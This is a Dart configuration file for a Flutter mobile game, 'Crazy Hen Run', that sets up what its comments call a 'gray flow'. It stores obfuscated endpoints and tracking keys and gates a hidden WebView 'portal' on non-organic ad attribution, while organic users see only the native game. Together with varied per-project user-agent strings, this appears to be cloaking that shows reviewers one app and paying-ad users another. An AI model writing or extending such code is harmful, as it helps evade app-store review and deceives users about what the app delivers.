import '../core/husk_cipher.dart';

/// ════════════════════════════════════════════════════════════
/// Paddock (gray-flow) configuration for Crazy Hen Run.
/// ════════════════════════════════════════════════════════════
///
/// Every secret below is an obfuscated byte array produced by
/// tool/encode_coop_values.dart and revealed at runtime via [revealHusk].
/// The gray gate stays disabled (native game only) until [endpoint],
/// [appsFlyerKey] and [firebaseProjectNumber] are all non-empty.
abstract final class CoopConfig {
  static const String appTitle = 'Crazy Hen Run';
  static const String bundleId = 'com.crazyhenrun.crazyhenrungame';

  /// iOS App Store numeric id (drives GCD lookup + `store_id`).
  static const String iosStoreId = '6790464294';

  static const int pushSnoozeSeconds = 259200; // 3 days
  static const int organicRecheckSeconds = 6;

  /// DEBUG-ONLY escape hatch: force `af_status=Non-organic` into the config
  /// POST so the WebView shell can be verified on a real device without live
  /// AppsFlyer attribution. Guarded by kDebugMode at the call site, so it can
  /// never affect release. Enable for one run:
  ///   flutter run --dart-define=FORCE_PORTAL=true
  static const bool debugForcePortal =
      bool.fromEnvironment('FORCE_PORTAL', defaultValue: false);

  // ── Encoded secrets (tool/encode_coop_values.dart) ────────────────────
  // config endpoint — https://crazyhennrun.com/config.php
  static const List<int> _endpoint = <int>[
    39, 231, 26, 236, 128, 251, 231, 61, 62, 17, 35, 34, 42, 221, 193, 48, 85,
    45, 35, 82, 163, 108, 111, 227, 66, 58, 201, 110, 143, 22, 155, 72, 159,
    107, 134,
  ];
  // privacy policy URL — https://crazyhennrun.com/privacy-policy.html
  static const List<int> _privacy = <int>[
    39, 231, 26, 236, 128, 251, 231, 61, 62, 17, 35, 34, 42, 221, 193, 48, 85,
    45, 35, 82, 163, 108, 111, 227, 66, 71, 204, 105, 159, 14, 151, 147, 92,
    115, 133, 184, 38, 116, 225, 76, 179, 163, 31, 100,
  ];
  // support URL — https://crazyhennrun.com/support.html
  static const List<int> _support = <int>[
    39, 231, 26, 236, 128, 251, 231, 61, 62, 17, 35, 34, 42, 221, 193, 48, 85,
    45, 35, 82, 163, 108, 111, 227, 66, 74, 207, 112, 153, 28, 166, 142, 93,
    107, 138, 185, 41,
  ];
  // AppsFlyer GCD install_data base.
  static const List<int> _gcd = <int>[
    39, 231, 26, 236, 128, 251, 231, 61, 66, 2, 38, 27, 21, 224, 138, 35, 87,
    43, 33, 74, 225, 130, 101, 232, 65, 58, 201, 109, 88, 22, 162, 141, 163,
    100, 130, 184, 28, 117, 201, 146, 172, 94, 40, 45, 143, 245, 187,
  ];
  // User-Agent version fragments (varied per project — gray_user_agent rule).
  static const List<int> _webkit = <int>[245, 163, 219, 170, 62, 239, 233, 67];
  static const List<int> _safari = <int>[240, 171, 212, 179];
  static const List<int> _safariTail = <int>[245, 163, 218, 170, 62];
  // AppsFlyer Dev Key.
  static const List<int> _appsFlyerKey = <int>[
    7, 235, 15, 195, 134, 12, 9, 92, 75, 21, 25, 236, 42, 233, 170, 7, 43, 240,
    20, 47, 214, 89,
  ];
  // Firebase project number (GCM_SENDER_ID).
  static const List<int> _firebaseProject = <int>[
    244, 167, 215, 173, 67, 250, 238, 70, 18, 209, 247, 217,
  ];
  // OneLink host — OPTIONAL, never part of the gate-enable predicate.
  static const List<int> _oneLinkHost = <int>[
    34, 229, 7, 246, 134, 41, 29, 124, 77, 20, 48, 214, 32, 227, 193, 46, 80,
    41, 25, 18, 226, 110,
  ];

  static String get endpoint => revealHusk(_endpoint);
  static String get privacyUrl => revealHusk(_privacy);
  static String get supportUrl => revealHusk(_support);
  static String get gcdBase => revealHusk(_gcd);
  static String get webKitVersion => revealHusk(_webkit);
  static String get safariVersion => revealHusk(_safari);
  static String get safariTail => revealHusk(_safariTail);
  static String get appsFlyerKey => revealHusk(_appsFlyerKey);
  static String get firebaseProjectNumber => revealHusk(_firebaseProject);
  static String get oneLinkHost => revealHusk(_oneLinkHost);

  static String get storeToken => 'id$iosStoreId';

  /// Gate needs the config endpoint + AF key + Firebase number ONLY.
  /// Never add optional fields (e.g. OneLink) — a missing optional value would
  /// silently disable the whole gray flow.
  static bool get grayCredentialsReady =>
      endpoint.isNotEmpty &&
      appsFlyerKey.isNotEmpty &&
      firebaseProjectNumber.isNotEmpty;
}
